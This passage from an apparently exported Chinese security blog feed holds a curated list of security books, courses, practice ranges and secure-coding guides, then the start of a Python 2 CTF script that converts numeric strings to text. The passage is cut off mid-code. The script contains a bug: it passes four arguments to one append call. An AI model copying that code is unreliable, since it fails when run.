title="JavaScript语言精粹 (2008)"></a><a href="http://www.amazon.com/JavaScript-Good-Parts-Douglas-Crockford/dp/0596517742" target="_blank" rel="external">JavaScript语言精粹</a> (2008)</h3><h3 id="Windows内部实现-囊括Windows-Server-2008和Windows-Vista-2007"><a href="#Windows内部实现-囊括Windows-Server-2008和Windows-Vista-2007" class="headerlink" title="Windows内部实现:囊括Windows Server 2008和Windows Vista (2007)"></a><a href="http://www.amazon.com/Windows%C2%AE-Internals-Including-Developer-Reference/dp/0735625301" target="_blank" rel="external">Windows内部实现:囊括Windows Server 2008和Windows Vista</a> (2007)</h3><h3 id="Mac黑客手册-2009"><a href="#Mac黑客手册-2009" class="headerlink" title="Mac黑客手册 (2009)"></a><a href="http://www.amazon.com/The-Hackers-Handbook-Charlie-Miller/dp/0470395362" target="_blank" rel="external">Mac黑客手册</a> (2009)</h3><h3 id="IDA-Pro权威指南-世界上最受欢迎反汇编者的非正式指南-2008"><a href="#IDA-Pro权威指南-世界上最受欢迎反汇编者的非正式指南-2008" class="headerlink" title="IDA Pro权威指南:世界上最受欢迎反汇编者的非正式指南 (2008)"></a><a href="http://www.amazon.com/The-IDA-Pro-Book-Disassembler/dp/1593271786" target="_blank" rel="external">IDA Pro权威指南:世界上最受欢迎反汇编者的非正式指南</a> (2008)</h3><h3 id="用TCP-IP进行网际互连（第2卷）：设计、实现与内核（ANSI-C版）（第3版）-1998"><a href="#用TCP-IP进行网际互连（第2卷）：设计、实现与内核（ANSI-C版）（第3版）-1998" class="headerlink" title="用TCP/IP进行网际互连（第2卷）：设计、实现与内核（ANSI C版）（第3版） (1998)"></a><a href="http://www.amazon.com/Internetworking-TCP-Vol-Implementation-Internals/dp/0139738436" target="_blank" rel="external">用TCP/IP进行网际互连（第2卷）：设计、实现与内核（ANSI C版）（第3版）</a> (1998)</h3><h3 id="网络算法：设计快速网络设备的跨学科方法-2004"><a href="#网络算法：设计快速网络设备的跨学科方法-2004" class="headerlink" title="网络算法：设计快速网络设备的跨学科方法 (2004)"></a><a href="http://www.amazon.com/Network-Algorithmics-Interdisciplinary-Designing-Networking/dp/0120884771" target="_blank" rel="external">网络算法：设计快速网络设备的跨学科方法</a> (2004)</h3><h3 id="计算机结构-麻省理工学院电子电气工程与计算机科学系教材-1989"><a href="#计算机结构-麻省理工学院电子电气工程与计算机科学系教材-1989" class="headerlink" title="计算机结构 (麻省理工学院电子电气工程与计算机科学系教材) (1989)"></a><a href="http://www.amazon.com/Computation-Structures-Electrical-Engineering-Computer/dp/0262231395" target="_blank" rel="external">计算机结构 (麻省理工学院电子电气工程与计算机科学系教材)</a> (1989)</h3><h3 id="软件加密与解密-2009"><a href="#软件加密与解密-2009" class="headerlink" title="软件加密与解密 (2009)"></a><a href="http://www.amazon.com/Surreptitious-Software-Obfuscation-Watermarking-Tamperproofing/dp/0321549252" target="_blank" rel="external">软件加密与解密</a> (2009)</h3><h3 id="安全编程：开发安全程序-2015"><a href="#安全编程：开发安全程序-2015" class="headerlink" title="安全编程：开发安全程序 (2015)"></a><a href="http://www.dwheeler.com/secure-programs/" target="_blank" rel="external">安全编程：开发安全程序</a> (2015)</h3><h3 id="安全工程：构建可靠分布式系统指南（第二版）-2008"><a href="#安全工程：构建可靠分布式系统指南（第二版）-2008" class="headerlink" title="安全工程：构建可靠分布式系统指南（第二版） (2008)"></a><a href="https://www.cl.cam.ac.uk/~rja14/book.html" target="_blank" rel="external">安全工程：构建可靠分布式系统指南（第二版）</a> (2008)</h3><h3 id="防弹SSL和TLS：理解和部署SSL-TLS和PKI以保护服务器和Web应用安全-2014"><a href="#防弹SSL和TLS：理解和部署SSL-TLS和PKI以保护服务器和Web应用安全-2014" class="headerlink" title="防弹SSL和TLS：理解和部署SSL/TLS和PKI以保护服务器和Web应用安全 (2014)"></a><a href="https://www.feistyduck.com/books/bulletproof-ssl-and-tls/" target="_blank" rel="external">防弹SSL和TLS：理解和部署SSL/TLS和PKI以保护服务器和Web应用安全</a> (2014)</h3><h2 id="课程"><a href="#课程" class="headerlink" title="课程"></a>课程</h2><h3 id="计算机安全攻击（CIS-4930）FSU"><a href="#计算机安全攻击（CIS-4930）FSU" class="headerlink" title="计算机安全攻击（CIS 4930）FSU"></a><a href="https://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/" target="_blank" rel="external">计算机安全攻击（CIS 4930）FSU</a></h3><p>佛罗里达州立大学Owen Redwood教授的漏洞研究和攻击课程。</p><p><strong>一定要看看<a href="https://www.cs.fsu.edu/~redwood/OffensiveComputerSecurity/lectures.html" target="_blank" rel="external">讲座</a>！</strong></p><h3 id="黑客之夜"><a href="#黑客之夜" class="headerlink" title="黑客之夜"></a><a href="https://github.com/isislab/Hack-Night" target="_blank" rel="external">黑客之夜</a></h3><p>由纽约大学理工学院的旧渗透测试和漏洞分析课程发展而来，黑客之夜课程清晰明了地介绍各种安全攻击。</p><h2 id="网站"><a href="#网站" class="headerlink" title="网站"></a>网站</h2><h3 id="Hack-This-Site"><a href="#Hack-This-Site" class="headerlink" title="Hack This Site!"></a><a href="http://www.hackthissite.org" target="_blank" rel="external">Hack This Site!</a></h3><p>通过尝试黑掉网站了解应用程序安全。</p><h3 id="Enigma-Group"><a href="#Enigma-Group" class="headerlink" title="Enigma Group"></a><a href="http://www.enigmagroup.org" target="_blank" rel="external">Enigma Group</a></h3><p>黑客和安全专家训练靶场。</p><h3 id="Web-App-Sec-Quiz"><a href="#Web-App-Sec-Quiz" class="headerlink" title="Web App Sec Quiz"></a><a href="https://timoh6.github.io/WebAppSecQuiz/" target="_blank" rel="external">Web App Sec Quiz</a></h3><p>自我评估测验Web应用安全。</p><h3 id="SecurePasswords-info"><a href="#SecurePasswords-info" class="headerlink" title="SecurePasswords.info"></a><a href="https://securepasswords.info" target="_blank" rel="external">SecurePasswords.info</a></h3><p>在几种语言/框架中安全的密码。</p><h3 id="Security-News-Feeds-Cheat-Sheet"><a href="#Security-News-Feeds-Cheat-Sheet" class="headerlink" title="Security News Feeds Cheat-Sheet"></a><a href="http://lzone.de/cheat-sheet/Security-News-Feeds" target="_blank" rel="external">Security News Feeds Cheat-Sheet</a></h3><p>有关安全新闻来源列表。</p><h3 id="Open-Security-Training"><a href="#Open-Security-Training" class="headerlink" title="Open Security Training"></a><a href="http://opensecuritytraining.info/" target="_blank" rel="external">Open Security Training</a></h3><p>有关开放的x86编程，黑客和取证培训的视频课程。</p><h3 id="MicroCorruption"><a href="#MicroCorruption" class="headerlink" title="MicroCorruption"></a><a href="https://microcorruption.com/login" target="_blank" rel="external">MicroCorruption</a></h3><p>CTF比赛形式地学习汇编和嵌入式设备安全。</p><h3 id="The-Matasano-Crypto-Challenges"><a href="#The-Matasano-Crypto-Challenges" class="headerlink" title="The Matasano Crypto Challenges"></a><a href="http://cryptopals.com" target="_blank" rel="external">The Matasano Crypto Challenges</a></h3><p>由<a href="http://matasano.com" target="_blank" rel="external">Matasano Security</a>编写的一系列编程练习，Maciej Ceglowski给了详细<a href="https://blog.pinboard.in/2013/04/the_matasano_crypto_challenges" target="_blank" rel="external">介绍</a>。</p><h3 id="PentesterLab"><a href="#PentesterLab" class="headerlink" title="PentesterLab"></a><a href="https://pentesterlab.com" target="_blank" rel="external">PentesterLab</a></h3><p>PentesterLab提供<a href="https://pentesterlab.com/exercises/" target="_blank" rel="external">免费的实践练习</a> 和<a href="https://pentesterlab.com/bootcamp/" target="_blank" rel="external">学习规划指南</a> 。</p><h3 id="Juice-Shop"><a href="#Juice-Shop" class="headerlink" title="Juice Shop"></a><a href="https://bkimminich.github.io/juice-shop" target="_blank" rel="external">Juice Shop</a></h3><p>存在安全隐患的Javascript Web应用程序练习靶场。</p><h3 id="Supercar-Showdown"><a href="#Supercar-Showdown" class="headerlink" title="Supercar Showdown"></a><a href="http://hackyourselffirst.troyhunt.com/" target="_blank" rel="external">Supercar Showdown</a></h3><p>通过学习实际的网络攻击来提高自身的安全技能。</p><h3 id="博客"><a href="#博客" class="headerlink" title="博客"></a>博客</h3><h4 id="Crypto-Fails"><a href="#Crypto-Fails" class="headerlink" title="Crypto Fails"></a><a href="http://cryptofails.com" target="_blank" rel="external">Crypto Fails</a></h4><p>详解具有安全隐患的加密技术。</p><h4 id="NCC-Group"><a href="#NCC-Group" class="headerlink" title="NCC Group"></a><a href="https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/" target="_blank" rel="external">NCC Group</a></h4><p>国家计算中心（National Computing Centre）博客</p><h4 id="Scott-Helme"><a href="#Scott-Helme" class="headerlink" title="Scott Helme"></a><a href="https://scotthelme.co.uk" target="_blank" rel="external">Scott Helme</a></h4><p>学习有关安全和性能方面的知识。</p><h3 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a>Wiki</h3><h4 id="OWASP-Top-Ten-Project"><a href="#OWASP-Top-Ten-Project" class="headerlink" title="OWASP Top Ten Project"></a><a href="https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project" target="_blank" rel="external">OWASP Top Ten Project</a></h4><p>Web应用程序中常见的十大安全漏洞。</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="Qualys-SSL-Labs"><a href="#Qualys-SSL-Labs" class="headerlink" title="Qualys SSL Labs"></a><a href="https://www.ssllabs.com/" target="_blank" rel="external">Qualys SSL Labs</a></h4><p>著名的SSL和TLS攻击工具套件。</p><h4 id="securityheaders-io"><a href="#securityheaders-io" class="headerlink" title="securityheaders.io"></a><a href="https://securityheaders.io/" target="_blank" rel="external">securityheaders.io</a></h4><p>轻松快速地评估HTTP响应标头的安全性。</p><h4 id="report-uri-io"><a href="#report-uri-io" class="headerlink" title="report-uri.io"></a><a href="https://report-uri.io" target="_blank" rel="external">report-uri.io</a></h4><p>免费的内容安全策略（Content Security Policy，CSP）和HTTP公钥钉扎（HTTP Public Key Pinning，HPKP）报告服务。</p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><h2 id="书籍-1"><a href="#书籍-1" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Android安全编码标准-2015"><a href="#Android安全编码标准-2015" class="headerlink" title="Android安全编码标准 (2015)"></a><a href="https://www.securecoding.cert.org/confluence/display/android/Android+Secure+Coding+Standard" target="_blank" rel="external">Android安全编码标准</a> (2015)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍了Android开发的安全编码标准。</p><h1 id="C"><a href="#C" class="headerlink" title="C"></a>C</h1><h2 id="书籍-2"><a href="#书籍-2" class="headerlink" title="书籍"></a>书籍</h2><h3 id="C安全编码标准-2006"><a href="#C安全编码标准-2006" class="headerlink" title="C安全编码标准 (2006)"></a><a href="https://www.securecoding.cert.org/confluence/display/c/SEI+CERT+C+Coding+Standard" target="_blank" rel="external">C安全编码标准</a> (2006)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍了C开发的安全编码标准。</p><h3 id="防御性编码：Fedora安全团队提高软件安全指南-2016"><a href="#防御性编码：Fedora安全团队提高软件安全指南-2016" class="headerlink" title="防御性编码：Fedora安全团队提高软件安全指南 (2016)"></a><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/index.html" target="_blank" rel="external">防御性编码：Fedora安全团队提高软件安全指南</a> (2016)</h3><p>通过介绍安全编码来提供提高软件安全的指导。 涵盖常见的编程语言和库，并着重于具体建议。</p><h1 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h1><h2 id="书籍-3"><a href="#书籍-3" class="headerlink" title="书籍"></a>书籍</h2><h3 id="C-安全编码标准-2006"><a href="#C-安全编码标准-2006" class="headerlink" title="C++安全编码标准 (2006)"></a><a href="https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=637" target="_blank" rel="external">C++安全编码标准</a> (2006)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍了C++开发的安全编码标准。</p><h1 id="C-Sharp"><a href="#C-Sharp" class="headerlink" title="C Sharp"></a>C Sharp</h1><h2 id="书籍-4"><a href="#书籍-4" class="headerlink" title="书籍"></a>书籍</h2><h3 id="安全驱动-NET-2015"><a href="#安全驱动-NET-2015" class="headerlink" title="安全驱动.NET (2015)"></a><a href="http://securitydriven.net/" target="_blank" rel="external">安全驱动.NET</a> (2015)</h3><p>介绍如何开发基于.NET Framework 4.5 安全的应用程序，具体涵盖加密和安全工程领域。</p><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="书籍-5"><a href="#书籍-5" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Java安全编码标准-2007"><a href="#Java安全编码标准-2007" class="headerlink" title="Java安全编码标准 (2007)"></a><a href="https://www.securecoding.cert.org/confluence/display/java/SEI+CERT+Oracle+Coding+Standard+for+Java" target="_blank" rel="external">Java安全编码标准</a> (2007)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍Java开发的安全编码标准。</p><h3 id="Java-SE安全编指南-2014"><a href="#Java-SE安全编指南-2014" class="headerlink" title="Java SE安全编指南 (2014)"></a><a href="http://www.oracle.com/technetwork/java/seccodeguide-139067.html" target="_blank" rel="external">Java SE安全编指南</a> (2014)</h3><p>使用Oracle安全的Java编程指南。</p><h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node.js"></a>Node.js</h1><h2 id="文章-1"><a href="#文章-1" class="headerlink" title="文章"></a>文章</h2><h3 id="Node-js安全检查清单-2015"><a href="#Node-js安全检查清单-2015" class="headerlink" title="Node.js安全检查清单 (2015)"></a><a href="https://blog.risingstack.com/node-js-security-checklist/" target="_blank" rel="external">Node.js安全检查清单</a> (2015)</h3><p>提供了开发安全Node.js应用程序许多有用帮助信息。</p><h2 id="培训"><a href="#培训" class="headerlink" title="培训"></a>培训</h2><h3 id="Lift-Security团队的安全培训"><a href="#Lift-Security团队的安全培训" class="headerlink" title="Lift Security团队的安全培训"></a><a href="https://liftsecurity.io/training" target="_blank" rel="external">Lift Security团队的安全培训</a></h3><p><a href="https://nodesecurity.io" target="_blank" rel="external">Node安全培训</a></p><h1 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h1><h2 id="书籍-6"><a href="#书籍-6" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Perl安全编码标准-2011"><a href="#Perl安全编码标准-2011" class="headerlink" title="Perl安全编码标准 (2011)"></a><a href="https://www.securecoding.cert.org/confluence/display/perl/SEI+CERT+Perl+Coding+Standard" target="_blank" rel="external">Perl安全编码标准</a> (2011)</h3><p>由软件工程协会计算机安全应急响应组编写，详细地介绍了C++开发的安全编码标准。</p><h1 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h1><h2 id="书籍-7"><a href="#书籍-7" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Fedora防御编码指南中的Python章节"><a href="#Fedora防御编码指南中的Python章节" class="headerlink" title="Fedora防御编码指南中的Python章节"></a><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Defensive_Coding/chap-Defensive_Coding-Python.html" target="_blank" rel="external">Fedora防御编码指南中的Python章节</a></h3><p>列出应尽量避免的函数，参考其他介绍有关Python编码安全章节。</p><h3 id="Violent-Python"><a href="#Violent-Python" class="headerlink" title="Violent Python"></a><a href="http://www.amazon.com/Violent-Python-Cookbook-Penetration-Engineers/dp/1597499579" target="_blank" rel="external">Violent Python</a></h3><p>展示如何从对攻击性计算概念的理论认识转变为实际实现。</p><h2 id="网站-1"><a href="#网站-1" class="headerlink" title="网站"></a>网站</h2><h3 id="开放式Web应用程序安全项目中的Python安全Wiki-2014"><a href="#开放式Web应用程序安全项目中的Python安全Wiki-2014" class="headerlink" title="开放式Web应用程序安全项目中的Python安全Wiki (2014)"></a><a href="https://github.com/ebranca/owasp-pysec/wiki" target="_blank" rel="external">开放式Web应用程序安全项目中的Python安全Wiki</a> (2014)</h3><p>开放式Web应用程序安全项目中的Python安全Wiki。</p><h1 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h1><h2 id="书籍-8"><a href="#书籍-8" class="headerlink" title="书籍"></a>书籍</h2><h3 id="Ruby安全开发指南-2014"><a href="#Ruby安全开发指南-2014" class="headerlink" title="Ruby安全开发指南 (2014)"></a><a href="https://docs.fedoraproject.org/en-US/Fedora_Security_Team/1/html/Secure_Ruby_Development_Guide/index.html" target="_blank" rel="external">Ruby安全开发指南</a> (2014)</h3><p>Fedora安全团队确保Ruby安全开发的指南，可在<a href="https://github.com/jrusnack/secure-ruby-development-guide" target="_blank" rel="external">Github</a>上获取。</p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="文章-2"><a href="#文章-2" class="headerlink" title="文章"></a>文章</h2><h3 id="关于时间的一切-2014"><a href="#关于时间的一切-2014" class="headerlink" title="关于时间的一切 (2014)"></a><a href="http://blog.ircmaxell.com/2014/11/its-all-about-time.html" target="_blank" rel="external">关于时间的一切</a> (2014)</h3><p>深入浅出地介绍PHP应用程序中的有关时序攻击。</p><h3 id="实现PHP长期持久性安全认证-2015"><a href="#实现PHP长期持久性安全认证-2015" class="headerlink" title="实现PHP长期持久性安全认证 (2015)"></a><a href="https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence" target="_blank" rel="external">实现PHP长期持久性安全认证</a> (2015)</h3><p>讨论密码策略，密码存储，“记住我”，Cookie和帐户恢复相关话题。</p><h3 id="PHP中防止跨站脚本攻击20个点子-2013"><a href="#PHP中防止跨站脚本攻击20个点子-2013" class="headerlink" title="PHP中防止跨站脚本攻击20个点子 (2013)"></a><a href="http://blog.astrumfutura.com/2013/04/20-point-list-for-preventing-cross-site-scripting-in-php" target="_blank" rel="external">PHP中防止跨站脚本攻击20个点子</a> (2013)</h3><p>Padriac Brady给出的关于构建不易受XSS影响的程序建议</p><h3 id="针对系统管理员最佳PHP安全配置25点建议-2011"><a href="#针对系统管理员最佳PHP安全配置25点建议-2011" class="headerlink" title="针对系统管理员最佳PHP安全配置25点建议 (2011)"></a><a href="http://www.cyberciti.biz/tips/php-security-best-practices-tutorial.html" target="_blank" rel="external">针对系统管理员最佳PHP安全配置25点建议</a> (2011)</h3><p>虽然这篇文章有点久了，不过面向PHP 7，其中大部分的建议仍然是极具参考价值的。</p><h3 id="PHP数据加密入门介绍-2014"><a href="#PHP数据加密入门介绍-2014" class="headerlink" title="PHP数据加密入门介绍 (2014)"></a><a href="https://timoh6.github.io/2014/06/16/PHP-data-encryption-cheatsheet.html" target="_blank" rel="external">PHP数据加密入门介绍</a> (2014)</h3><p>@timoh6详细介绍PHP数据加密的实现。</p><h3 id="PHP应用程序防止SQL注入简明指南-2014"><a href="#PHP应用程序防止SQL注入简明指南-2014" class="headerlink" title="PHP应用程序防止SQL注入简明指南 (2014)"></a><a href="https://paragonie.com/blog/2015/05/preventing-sql-injection-in-php-applications-easy-and-definitive-guide" target="_blank" rel="external">PHP应用程序防止SQL注入简明指南</a> (2014)</h3><p>简单明了地介绍如何防止SQL注入。</p><h3 id="你不该使用Base64密码-2015"><a href="#你不该使用Base64密码-2015" class="headerlink" title="你不该使用Base64密码 (2015)"></a><a href="https://paragonie.com/blog/2015/08/you-wouldnt-base64-a-password-cryptography-decoded" target="_blank" rel="external">你不该使用Base64密码</a> (2015)</h3><p>通常被误用的加密术语和基本概念的可读概述，以PHP中的代码为示例，如果您对加密术语感到困惑，就从这里开始学习吧。</p><h3 id="PHP应用程序安全数据加密指南-2015"><a href="#PHP应用程序安全数据加密指南-2015" class="headerlink" title="PHP应用程序安全数据加密指南 (2015)"></a><a href="https://paragonie.com/white-paper/2015-secure-php-data-encryption" target="_blank" rel="external">PHP应用程序安全数据加密指南</a> (2015)</h3><p>讨论端到端网络层加密（HTTPS）的重要性以及静态数据的安全加密，然后介绍开发人员应该为特定用例使用的特定加密工具， <a href="https://pecl.php.net/package/libsodium" target="_blank" rel="external">libsodium</a>、<a href="https://github.com/defuse/php-encryption" target="_blank" rel="external">增强防御的安全PHP加密库</a>以及OpenSSL。</p><h2 id="书籍-9"><a href="#书籍-9" class="headerlink" title="书籍"></a>书籍</h2><h3 id="PHP安全：核心理念"><a href="#PHP安全：核心理念" class="headerlink" title="PHP安全：核心理念"></a><a href="https://leanpub.com/securingphp-coreconcepts" target="_blank" rel="external">PHP安全：核心理念</a></h3><p>介绍了一些最常见的安全性方面知识，并提供PHP其中常见的一些例子。</p><h3 id="PHP项目中使用Libsodium"><a href="#PHP项目中使用Libsodium" class="headerlink" title="PHP项目中使用Libsodium"></a><a href="https://paragonie.com/book/pecl-libsodium" target="_blank" rel="external">PHP项目中使用Libsodium</a></h3><p>调用libsodium加密库快速开发安全和可靠的应用程序。</p><h2 id="干货库"><a href="#干货库" class="headerlink" title="干货库"></a>干货库</h2><h3 id="defuse-php-encryption"><a href="#defuse-php-encryption" class="headerlink" title="defuse/php-encryption"></a><a href="https://github.com/defuse/php-encryption" target="_blank" rel="external">defuse/php-encryption</a></h3><p>用于PHP应用程序的对称密钥加密库。</p><h3 id="ircmaxell-password-compat"><a href="#ircmaxell-password-compat" class="headerlink" title="ircmaxell/password_compat"></a><a href="https://github.com/ircmaxell/password_compat" target="_blank" rel="external">ircmaxell/password_compat</a></h3><p>如果你使用PHP 5.3.7+或5.4，可以使用这个库来哈希密码。</p><h3 id="ircmaxell-RandomLib"><a href="#ircmaxell-RandomLib" class="headerlink" title="ircmaxell/RandomLib"></a><a href="https://github.com/ircmaxell/RandomLib" target="_blank" rel="external">ircmaxell/RandomLib</a></h3><p>用于生成随机字符串或数字。</p><h3 id="thephpleague-oauth2-server"><a href="#thephpleague-oauth2-server" class="headerlink" title="thephpleague/oauth2-server"></a><a href="https://github.com/thephpleague/oauth2-server" target="_blank" rel="external">thephpleague/oauth2-server</a></h3><p>安全的OAuth2服务器实现。</p><h3 id="paragonie-random-compat"><a href="#paragonie-random-compat" class="headerlink" title="paragonie/random_compat"></a><a href="https://github.com/paragonie/random_compat" target="_blank" rel="external">paragonie/random_compat</a></h3><p>PHP 7提供了一组新的伪随机数生成器（Cryptographically Secure Pseudo-Random Number Generato，CSPRNG）函数：<code>random_bytes()</code>和<code>random_int()</code>， 社区致力于在PHP 5（向前兼容）中提供公开统一的API。</p><h3 id="psecio-gatekeeper"><a href="#psecio-gatekeeper" class="headerlink" title="psecio/gatekeeper"></a><a href="https://github.com/psecio/gatekeeper" target="_blank" rel="external">psecio/gatekeeper</a></h3><p>一个安全的认证和授权库，基于角色的访问控制实现和<a href="https://paragonie.com/blog/2015/04/secure-authentication-php-with-long-term-persistence#title.2" target="_blank" rel="external">Paragon Initiative Enterprise公司</a>给出的安全“记住我”复选框建议。</p><h3 id="openwall-phpass"><a href="#openwall-phpass" class="headerlink" title="openwall/phpass"></a><a href="http://www.openwall.com/phpass/" target="_blank" rel="external">openwall/phpass</a></h3><p>用于PHP应用程序的便携式公有领域密码哈希框架。</p><h2 id="网站-2"><a href="#网站-2" class="headerlink" title="网站"></a>网站</h2><h3 id="websec-io"><a href="#websec-io" class="headerlink" title="websec.io"></a><a href="http://websec.io" target="_blank" rel="external">websec.io</a></h3><p>致力于通过基础安全知识，新兴技术和PHP安全编码相关的主题来提高开发人员有关安全意识。</p><h3 id="博客-1"><a href="#博客-1" class="headerlink" title="博客"></a>博客</h3><h4 id="Paragon-Initiative-Enterprises-Blog"><a href="#Paragon-Initiative-Enterprises-Blog" class="headerlink" title="Paragon Initiative Enterprises Blog"></a><a href="https://paragonie.com/blog/" target="_blank" rel="external">Paragon Initiative Enterprises Blog</a></h4><p>位于佛罗里达州奥兰多安全技术咨询公司博客</p><h4 id="ircmaxell’s-blog"><a href="#ircmaxell’s-blog" class="headerlink" title="ircmaxell’s blog"></a><a href="http://blog.ircmaxell.com" target="_blank" rel="external">ircmaxell’s blog</a></h4><p>介绍关于PHP安全和性能以及Web应用程序开发的博客。</p><h4 id="Padraic-Brady’s-Blog"><a href="#Padraic-Brady’s-Blog" class="headerlink" title="Pádraic Brady’s Blog"></a><a href="http://blog.astrumfutura.com" target="_blank" rel="external">Pádraic Brady’s Blog</a></h4><p>PádraicBrady是Zend Framework领域的安全专家。</p><h3 id="订阅"><a href="#订阅" class="headerlink" title="订阅"></a>订阅</h3><h4 id="Securing-PHP-Weekly"><a href="#Securing-PHP-Weekly" class="headerlink" title="Securing PHP Weekly"></a><a href="http://securingphp.com" target="_blank" rel="external">Securing PHP Weekly</a></h4><p>每周更新有关PHP安全知识。</p>]]></content>
      
        <categories>
            
            <category> 干货分享 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 书籍推荐 </tag>
            
            <tag> awesome </tag>
            
            <tag> 安全开发指南 </tag>
            
            <tag> 博客推荐 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> 练习靶场 </tag>
            
            <tag> 应用程序安全 </tag>
            
            <tag> 学习清单 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CTF常用到的数字串转字符串脚本]]></title>
      <url>/2017/04/07/CTF%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E6%95%B0%E5%AD%97%E4%B8%B2%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>CTF常用到数字串转字符串，也有许多在线的网站支持转换，不过要求这样或那样的格式要求，所以就动手写了一个自动识别转换的脚本，下载地址<a href="https://github.com/sunnyelf/auto_num_str_to_text" target="_blank" rel="external">github</a>。</p><p>下面是演示截图：</p><a id="more"></a><p><img src="https://raw.githubusercontent.com/sunnyelf/auto_num_str_to_text/master/1.png" alt="CTF常用到的数字串转字符串脚本"></p><p><img src="https://raw.githubusercontent.com/sunnyelf/auto_num_str_to_text/master/2.png" alt="CTF常用到的数字串转字符串脚本"></p><h2 id="0x01-代码"><a href="#0x01-代码" class="headerlink" title="0x01 代码"></a>0x01 代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="comment"># author:admin[@hackfun.org]</span></div><div class="line"><span class="comment"># license:GPL v3</span></div><div class="line"><span class="comment"># blog:hackfun.org</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_error</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'[!] invailed numeric string.'</span>)</div><div class="line">    exit(<span class="number">1</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_filter</span><span class="params">()</span>:</span></div><div class="line">    print(<span class="string">'[*] You can input binary/decimal/hexadecimal numeric string to convert text.'</span>)</div><div class="line">    data = raw_input(<span class="string">'[&lt;] '</span>)</div><div class="line">    filter_char = []</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="number">48</span>):</div><div class="line">        filter_char.append(chr(num))</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(<span class="number">58</span>, <span class="number">65</span>):</div><div class="line">        filter_char.append(chr(num))</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(<span class="number">71</span>, <span class="number">97</span>):</div><div class="line">        filter_char.append(chr(num))</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(<span class="number">103</span>, <span class="number">256</span>):</div><div class="line">        filter_char.append(chr(num))</div><div class="line">    filter_char.append(<span class="string">'0x'</span>, <span class="string">'0X'</span>, <span class="string">'0b'</span>, <span class="string">'0B'</span>)</div><div class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> filter_char:</div><div class="line">        data = data.replace(char, <span class="string">''</span>)</div><div class="line"></div><div class="line">    <span 